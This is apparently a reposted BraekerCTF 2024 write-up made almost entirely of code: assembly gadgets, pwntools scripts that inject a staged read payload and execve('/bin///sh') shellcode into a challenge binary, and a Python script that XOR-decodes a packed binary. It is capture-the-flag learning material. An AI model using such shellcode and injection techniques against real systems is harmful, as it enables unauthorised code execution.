# BraekerCTF 2024 Writeup

> 原文: https://www.ctfiot.com/164132.html
> ID: 164132


```
mov eax, 3 ; システムコール番号3 (sys_read)
mov ebx, 0 ; ファイルディスクリプタ0 (標準入力)
pop ecx
xor cl,cl
mov edx,0x18
int 0x80
add al, [eax]
add eax,[eax]
add [eax],eax
```



```
; nasm -f elf32 tmp.asm && ld -m elf_i386 -o tmp tmp.o
section .text
global _start

vlun:
 mov eax, 3 ; システムコール番号3 (sys_read)
 mov ebx, 0 ; ファイルディスクリプタ0 (標準入力)
 pop ecx
 xor cl,cl
 mov edx,0x18
 int 0x80
 add al, [eax]
 add eax,[eax]
 add [eax],eax

_start:
 call vlun
 xor al, 0
```



```
from pwn import *

# p = remote("0.cloud.chals.io", 20922)
p = process("./download.elf")

payload = asm(
"""
 nop
 nop
 nop
 nop
 mov eax, 4
 mov ebx, 1
 int 0x80
 jmp ecx
""")

p.send(payload)
p.interactive()
```



```
from pwn import *

# p = remote("0.cloud.chals.io", 20922)
p = process("./download.elf")

payload = asm(
"""
 nop
 nop
 nop
 nop
 nop
 nop
 nop
 mov al, 0x3
 add ecx,0x12
 mov dl, 0x7f
 int 0x80
 jmp ecx
""")

# print(shellcraft.sh())
shellcode = asm(
"""
 /* execve(path='/bin///sh', argv=['sh'], envp=0) */
 /* push b'/bin///sh\x00' */
 push 0x68
 push 0x732f2f2f
 push 0x6e69622f
 mov ebx, esp
 /* push argument array ['sh\x00'] */
 /* push 'sh\x00\x00' */
 push 0x1010101
 xor dword ptr [esp], 0x1016972
 xor ecx, ecx
 push ecx /* null terminate */
 push 4
 pop ecx
 add ecx, esp
 push ecx /* 'sh\x00' */
 mov ecx, esp
 xor edx, edx
 /* call execve() */
 push SYS_execve /* 0xb */
 pop eax
 int 0x80
""")

p.send(payload)
p.send(shellcode)
p.interactive()
```



```
section .text
global _start

first:
 pop rdx
 mov rax,rdx
 jmp second

second:
 add rdx,0x91
 sub rax,0xe
 mov rsi,rax
 xor ecx,ecx
 mov cl,0x56
 mov rax,rsi
point:
 mov sil,BYTE PTR [rax]
 xor BYTE PTR [rdx],sil
 xor QWORD PTR [rdx],0x42
 inc rdx
 inc rax
 loop point

_start:
 call first
```



```
with open("binary_shrink", "rb") as f:
 data = bytearray(f.read()) + bytearray([0 for i in range(0x100)])

rax = 0
rdx = 0xe + 0x91

with open("generated_binary", "wb") as f:
 for i in range(0x56):
 data[rdx] = data[rdx] ^ data[i]
 data[rdx] = data[rdx] ^ 0x42
 rdx += 1
 
 f.write(data)
```
